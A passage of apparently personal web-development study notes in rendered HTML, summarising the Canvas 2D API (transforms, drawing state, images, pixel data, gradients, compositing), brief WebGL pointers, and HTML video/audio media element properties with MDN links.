class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span><span class="mord"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></div></section><p>scaling, skewing and moving, respectively</p></li> <li><p><code>CanvasRenderingContext2D.setTransform(m11, m12, m21, m22, dx, dy)</code> — Resets the current transform to the identity matrix, and then invokes the <code>transform()</code> method with the same arguments</p></li> <li><p><code>CanvasRenderingContext2D.resetTransform(): void</code> — Resets the current transform by the identity matrix</p> <ul><li>equivalent to <code>setTransform(1, 0, 0, 1, 0, 0);</code></li></ul></li></ul></li> <li><p>The canvas state</p> <ul><li>The drawing state that gets saved onto a stack consists of:
<ul><li>The current transformation matrix</li> <li>The current clipping region</li> <li>The current dash list</li> <li>The current values of the following attributes: <code>strokeStyle</code>, <code>fillStyle</code>, <code>globalAlpha</code>, <code>lineWidth</code>, <code>lineCap</code>, <code>lineJoin</code>, <code>miterLimit</code>, <code>lineDashOffset</code>, <code>shadowOffsetX</code>, <code>shadowOffsetY</code>, <code>shadowBlur</code>, <code>shadowColor</code>, <code>globalCompositeOperation</code>, <code>font</code>, <code>textAlign</code>, <code>textBaseline</code>, <code>direction</code>, <code>imageSmoothingEnabled</code></li></ul></li> <li><code>CanvasRenderingContext2D.save(): void</code> — Saves the current drawing style state using a stack so you can revert any change you make to it using <code>restore()</code></li> <li><code>CanvasRenderingContext2D.restore(): void</code> — Restores the drawing style state to the last element on the 'state stack' saved by <code>save()</code></li> <li><code>CanvasRenderingContext2D.canvas</code> — A read-only back-reference to the <code>HTMLCanvasElement</code>. Might be <code>null</code> if it is not associated with a <code>&lt;canvas&gt;</code> element</li></ul></li></ol> <h4 id="image-drawing"><a href="#image-drawing" class="header-anchor">#</a> Image Drawing</h4> <ol><li><p><code>CanvasRenderingContext2D.drawImage(): void</code></p> <ul><li><code>drawImage(image, dx, dy)</code><br> <code>drawImage(image, dx, dy, dWidth, dHeight)</code><br> <code>drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)</code></li> <li>image
<ul><li>An element to draw into the context</li> <li>The specification permits any canvas image source (<code>CanvasImageSource</code>), specifically, a <code>CSSImageValue</code>, an <code>HTMLImageElement</code>, an <code>SVGImageElement</code>, an <code>HTMLVideoElement</code> (current frame), an <code>HTMLCanvasElement</code>, an <code>ImageBitmap</code>, <code>CanvasRenderingContext2D</code>, <code>ImageData</code>, <code>Blob</code> or an <code>OffscreenCanvas</code></li> <li>use constructors: <code>Image()</code> <ul><li>make sure fully loaded before use: <code>onload</code></li></ul></li> <li>Using images from other domains can taint the canvas
<ul><li>up to <code>HTMLImageElement.crossOrigin</code></li> <li>when tainted, one can no longer pull data back out of the canvas</li></ul></li></ul></li> <li>sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight<br> <img src="/notes-of-tan/assets/img/11.6384b166.png" alt=""></li></ul></li> <li><p>Image smoothing</p> <ul><li><code>CanvasRenderingContext2D.imageSmoothingEnabled</code> — Image smoothing mode; if disabled, images will not be smoothed if scaled, defaults to <code>true</code></li></ul></li> <li><p>Pixel manipulation</p> <ul><li><code>ImageData</code> <ul><li>represents the underlying pixel data of an area of a <code>&lt;canvas&gt;</code> element</li> <li>constructor: <code>ImageData(width, height)</code>, <code>ImageData(array, width, height)</code></li> <li>properties
<ul><li><code>ImageData.data</code> Read only — Is a <code>Uint8ClampedArray</code> representing a one-dimensional array containing the data in the RGBA order, with integer values between 0 and 255 (included)</li> <li><code>ImageData.height</code> Read only — Is an unsigned long representing the actual height, in pixels, of the <code>ImageData</code></li> <li><code>ImageData.width</code> Read only — Is an unsigned long representing the actual width, in pixels, of the <code>ImageData</code></li></ul></li></ul></li> <li><code>CanvasRenderingContext2D.createImageData(w, h): ImageData</code><br> <code>CanvasRenderingContext2D.createImageData(imagedata)</code> — Creates a new, <strong>blank</strong> <code>ImageData</code> object with the specified dimensions. All of the pixels in the new object are transparent black</li> <li><code>CanvasRenderingContext2D.getImageData(sx, sy, sw, sh)</code> — Returns an <code>ImageData</code> object representing the underlying pixel data for the area of the canvas denoted by the rectangle which starts at (sx, sy) and has an sw width and sh height
<ul><li>not affected by the canvas transformation matrix</li></ul></li> <li><code>CanvasRenderingContext2D.putImageData(imagedata, dx, dy, dirtyX?, dirtyY?, dirtyWidth?, dirtyHeight): void</code> — Paints data from the given <code>ImageData</code> object onto the bitmap. If a dirty rectangle is provided, only the pixels from that rectangle are painted (slice of imagedata)</li></ul></li> <li><p>in coordination</p> <ul><li><code>self.createImageBitmap(image, options?): Promise&lt;ImageBitmap&gt;</code> +1 overload
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/createImageBitmap" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>ImageBitmap</code> <ul><li>represents a bitmap image which can be drawn to a <code>&lt;canvas&gt;</code> without undue latency</li></ul></li></ul></li></ol> <h4 id="shadows-gradients-and-patterns"><a href="#shadows-gradients-and-patterns" class="header-anchor">#</a> Shadows, Gradients and Patterns</h4> <ol><li><p>shadows</p> <ul><li><code>CanvasRenderingContext2D.shadowBlur</code> — Specifies the level blurring effect. Default 0</li> <li><code>CanvasRenderingContext2D.shadowColor</code> — Color of the shadow. Default fully-transparent black</li> <li><code>CanvasRenderingContext2D.shadowOffsetX</code> — Horizontal distance the shadow will be offset. Default 0</li> <li><code>CanvasRenderingContext2D.shadowOffsetY</code> — Vertical distance the shadow will be offset. Default 0</li></ul></li> <li><p>Gradients</p> <ul><li><code>CanvasRenderingContext2D.createLinearGradient(x0, y0, x1, y1): CanvasGradient</code> <ul><li>Creates a linear gradient along the line given by the coordinates represented by the parameters</li></ul></li> <li><code>CanvasGradient.addColorStop(offset, color): void</code> — Adds a new stop, defined by an offset and a color, to the gradient. If the offset is not between 0 and 1 an <code>INDEX_SIZE_ERR</code> is raised, if the color can't be parsed as a CSS <code>&lt;color&gt;</code>, a <code>SYNTAX_ERR</code> is raised.</li> <li><code>CanvasRenderingContext2D.createRadialGradient(x0, y0, r0, x1, y1, r1): CanvasGradient</code> — Creates a radial gradient given by the coordinates of the two circles represented by the parameters
<ul><li>start circle and end circle respectively</li></ul></li></ul></li> <li><p>Patterns</p> <ul><li><code>CanvasRenderingContext2D.createPattern(image, repetition): CanvasPattern</code> — Creates a pattern using the specified image (a <code>CanvasImageSource</code>). It repeats the source in the directions specified by the repetition argument
<ul><li>make fully loaded before use: <code>onload</code></li> <li>repetition
<ul><li><code>&quot;repeat&quot;</code>, <code>''</code>, <code>null</code> (both directions)</li> <li><code>&quot;repeat-x&quot;</code> (horizontal only)</li> <li><code>&quot;repeat-y&quot;</code> (vertical only)</li> <li><code>&quot;no-repeat&quot;</code> (neither)</li></ul></li></ul></li> <li><code>CanvasPattern</code> — An opaque object describing a pattern
<ul><li>can be used as a <code>fillStyle</code> or <code>strokeStyle</code></li> <li>method: <code>CanvasPattern.setTransform(matrix): void</code> <ul><li>matrix: <code>SVGMatrix</code>???</li></ul></li></ul></li></ul></li></ol> <h4 id="composition-and-optimization"><a href="#composition-and-optimization" class="header-anchor">#</a> Composition and Optimization</h4> <ol><li><p>Compositing</p> <ul><li><code>CanvasRenderingContext2D.globalAlpha</code> — Alpha value that is applied to shapes and images before they are composited onto the canvas. Default 1.0 (opaque)</li> <li><code>CanvasRenderingContext2D.globalCompositeOperation</code> — With globalAlpha applied this sets how shapes and images are drawn onto the existing bitmap
<ul><li>types on <a href="https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/globalCompositeOperation#Types" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>source-over</code> (default) — New drawing is drawn on top of the existing image</li> <li><code>source-in</code> — New drawing is drawn only where it overlaps the existing image. Everything else becomes transparent</li> <li><code>source-out</code> — New drawing is drawn only where it does not overlap the existing image. Everything else becomes transparent</li> <li><code>source-atop</code> — New drawing is drawn only where it overlaps the existing image. The existing image is otherwise unaffected</li> <li><code>destination-over</code> — New drawing is drawn underneath the existing image, visible only through previously transparent pixels</li> <li><code>destination-in</code> — New drawing is drawn underneath the existing image, and all places where the two images do not overlap become transparent</li> <li><code>destination-out</code> — New drawing erases the parts of the existing image where they overlap</li> <li><code>destination-atop</code> — New drawing is drawn behind the existing image. The existing image becomes transparent where there is no overlap with new drawing</li> <li><code>lighter</code> — New drawing is drawn by combining its values with the existing image values to create a lighter image</li> <li><code>copy</code> — New drawing erases the existing image and replaces it completely</li> <li><code>xor</code> — New drawing is drawn by XOR-ing the image data with the existing image</li></ul></li></ul></li> <li><p>Optimization</p> <ul><li>on <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Optimizing_canvas" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ol> <h3 id="webgl"><a href="#webgl" class="header-anchor">#</a> WebGL</h3> <ol><li><p><a href="https://github.com/mrdoob/three.js" target="_blank" rel="noopener noreferrer">three.js<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p>about WebGL</p> <ul><li>a 3D context for canvas</li> <li>the Khronos Group is developing the specification</li> <li>Familiarity with OpenGL ES 2.0 is recommended for using WebGL as a lot of concepts map directly
<ul><li><a href="www.opengl.org">OpenGL</a></li> <li><a href="www.learningwebgl.com">Learn WebGL</a></li></ul></li> <li>on <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p>From OpenGL</p> <ul><li>constants
<ul><li>constants are named in OpenGL with a prefix of <code>GL_</code></li> <li>each constant is available on the WebGL context object without the <code>GL_</code> prefix</li></ul></li> <li>Method Naming
<ul><li>many methods will indicate the number of arguments (1 through 4) followed by the data type
<ul><li><code>WebGLRenderingContext.uniform4i(location, v0, v1, v2, v3)</code>, <code>WebGLRenderingContext.uniform4fv(location, value)</code></li> <li>f for float, i for integer, v for vector (array)</li></ul></li></ul></li></ul></li> <li><p>draw</p> <ul><li>tbc</li> <li>p620</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API/Tutorial" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>WebGLRenderingContext.getError()</code>: errors are generally not thrown from WebGL operations</li></ul></li></ol> <h2 id="media-elements"><a href="#media-elements" class="header-anchor">#</a> Media Elements</h2> <ol><li><p><code>&lt;video&gt;</code> and <code>&lt;audio&gt;</code></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">controls</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>myVideo.mp4<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>video/mp4<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>myVideo.webm<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>video/webm<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Your browser doesn't support HTML5 video. Here is
     a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>myVideo.mp4<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>link to the video<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span> instead.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>fallback content: The content inside the opening and closing tags</li> <li>source
<ul><li><code>src</code> attribute</li> <li>multiple <code>&lt;source&gt;</code> elements
<ul><li>the browser will then use the first one it supports</li></ul></li></ul></li> <li><code>controls</code> attribute
<ul><li>the browser's default controls</li> <li>omit to use custom controls using JavaScript</li></ul></li> <li>position adjusting using CSS
<ul><li><code>object-position</code> and <code>object-fit</code></li></ul></li> <li>subtitles/captions
<ul><li><code>&lt;track&gt;</code> and WebVTT format</li></ul></li> <li>attributes
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video#Attributes" target="_blank" rel="noopener noreferrer">video MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio#Attributes" target="_blank" rel="noopener noreferrer">audio MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>attributes of audio are in a subset</li></ul></li></ul></li> <li><p><code>HTMLMediaElement</code></p> <ul><li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>HTML attributes
<ul><li><code>HTMLMediaElement.defaultMuted</code></li></ul></li> <li><code>HTMLMediaElement.currentSrc</code> Read only — Returns a <code>DOMString</code> with the absolute URL of the chosen media resource
<ul><li>The value is an empty string if the <code>networkState</code> property is EMPTY</li></ul></li> <li><code>HTMLMediaElement.currentTime</code> — Is a double indicating the current playback time in seconds. Setting this value seeks the media to the new time</li> <li><code>HTMLMediaElement.defaultPlaybackRate</code> — Is a double indicating the default playback rate for the media</li> <li><code>HTMLMediaElement.playbackRate</code> — Is a double that indicates the rate at which the media is being played back
<ul><li>if negative, the media is played backwards??? (not widely supported)</li> <li>The pitch of the audio is corrected by default and is the same for every speed</li></ul></li> <li><code>HTMLMediaElement.duration</code> Read only — Returns a double indicating the length of the media in seconds
<ul><li>or 0 if no media data is available</li> <li>If the media data is available but the length is unknown, this value is <code>NaN</code></li> <li>If the media is streamed and has no predefined length, the value is <code>Inf</code></li></ul></li> <li><code>HTMLMediaElement.ended</code> Read only — Returns a Boolean that indicates whether the media element has finished playing</li> <li><code>HTMLMediaElement.error</code> Read only — Returns a <code>MediaError</code> object for the most recent error, or <code>null</code> if there has not been an error
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaError" target="_blank" rel="noopener noreferrer"><code>MediaError</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>MediaError.code</code>, <code>MediaError.message</code></li></ul></li> <li><code>HTMLMediaElement.networkState</code> Read only — Returns a unsigned short (enumeration) indicating the current state of fetching the media over the network
<ul><li><code>HTMLMediaElement.NETWORK_EMPTY</code> 0 There is no data yet. Also, <code>readyState</code> is <code>HAVE_NOTHING</code></li> <li><code>NETWORK_IDLE</code> 1 <code>HTMLMediaElement</code> is active and has selected a resource, but is not using the network</li> <li><code>NETWORK_LOADING</code> 2 The browser is downloading <code>HTMLMediaElement</code> data</li> <li><code>NETWORK_NO_SOURCE</code> 3 No <code>HTMLMediaElement</code> <code>src</code> found</li></ul></li> <li><code>HTMLMediaElement.paused</code> Read only — Returns a Boolean that indicates whether the media element is paused</li> <li><code>HTMLMediaElement.played</code> Read only — Returns a <code>TimeRanges</code> object that contains the ranges of the media source that the browser has played, if any</li> <li><code>HTMLMediaElement.readyState</code> Read only — Returns a unsigned short (enumeration) indicating the readiness state of the media
<ul><li><code>HTMLMediaElement.HAVE_NOTHING</code> 0 No information is available about the media resource</li> <li><code>HAVE_METADATA</code> 1 Enough of the media resource has been retrieved that the metadata attributes are initialized. Seeking will no longer raise an exception</li> <li><code>HAVE_CURRENT_DATA</code> 2 Data is available for the current playback position, but not enough to actually play more than one frame</li> <li><code>HAVE_FUTURE_DATA</code> 3 Data for the current playback position as well as for at least a little bit of time into the future is available (in other words, at least two frames of video, for example)</li> <li><code>HAVE_ENOUGH_DATA</code> 4 Enough data is available—and the download rate is high enough—that the media can be played through to the end without interruption</li></ul></li> <li><code>HTMLMediaElement.seekable</code> Read only — Returns a <code>TimeRanges</code> object that contains the time ranges that the user is able to seek to, if any</li> <li><code>HTMLMediaElement.seeking</code> Read only — Returns a Boolean that indicates whether the media is in the process of seeking to a new position
</li> <li><code>HTMLMediaElement.volume</code> — Is a double indicating the audio volume, from 0.0 (silent) to 1.0 (loudest)</li></ul></li> <li>methods
<ul><li>not complete</li> <li><code>HTMLMediaElement.canPlayType(type: string): string</code> — Determines whether the specified media type can be played back. possible return
<ul><li><code>'probably'</code>: The specified media type appears to be playable</li> <li><code>'maybe'</code>: Cannot tell if the media type is playable without playing it</li> <li><code>''</code> (empty string): The specified media type definitely cannot be played</li> <li>type: MIME type</li></ul></li> <li><code>HTMLMediaElement.pause()</code> — Pauses the media playback</li> <li><code>HTMLMediaElement.play(): Promise</code> — Begins playback of the media
<ul><li>return in modern browsers: A <code>Promise</code> which is <code>fulfilled</code> when playback has been started, or is <code>rejected</code> if for any reason playback cannot be started</li></ul></li></ul></li></ul></li> <li><p><code>HTMLVideoElement</code></p> <ul><li>inherits: <code>HTMLMediaElement</code></li> <li>properties and methods
<ul><li><code>HTMLVideoElement.videoHeight</code> Read only — Returns an unsigned long containing the intrinsic height of the resource in CSS pixels</li> <li><code>HTMLVideoElement.videoWidth</code> Read only — Returns an unsigned long containing the intrinsic width of the resource in CSS pixels</li> <li><code>HTMLVideoElement.getVideoPlaybackQuality()</code> — Returns a <code>VideoPlaybackQuality</code> objects that contains the current playback metrics</li></ul></li> <li>properties of <code>VideoPlaybackQuality</code> <ul><li><code>VideoPlaybackQuality.creationTime</code> Read only — A <code>DOMHighResTimeStamp</code> containing the time in miliseconds since the start of the navigation and the creation of the object</li> <li><code>VideoPlaybackQuality.totalVideoFrames</code> Read only — An unsigned long giving the number of video frames created and dropped since the creation of the associated <code>HTMLVideoElement</code></li> <li><code>VideoPlaybackQuality.droppedVideoFrames</code> Read only — An unsigned long giving the number of video frames dropped since the creation of the associated <code>HTMLVideoElement</code></li> <li><code>VideoPlaybackQuality.corruptedVideoFrames</code> Read only — An unsigned long giving the number of video frames corrupted since the creation of the associated <code>HTMLVideoElement</code>. A corrupted frame may be created or dropped</li></ul></li></ul></li> <li><p><code>HTMLAudioElement</code></p> <ul><li>inherits: <code>HTMLMediaElement</code></li> <li>constructor: <code>Audio(src?: string)</code></li></ul></li> <li><p><code>TimeRanges</code></p> <ul><li>used to represent a set of time ranges, primarily for the purpose of tracking which portions of media have been buffered when loading</li> <li><code>TimeRanges.length</code> Read only — Returns an unsigned long representing the number of time ranges represented by the time range object</li> <li><code>TimeRanges.start(index: number): number</code> — Returns the time for the start of the range with the specified index</li> <li><code>TimeRanges.end(index: number): number</code> — Returns the time for the end of the specified range</li></ul></li> <li><p>Media Events</p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Media_events" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p><code>&lt;track&gt;</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 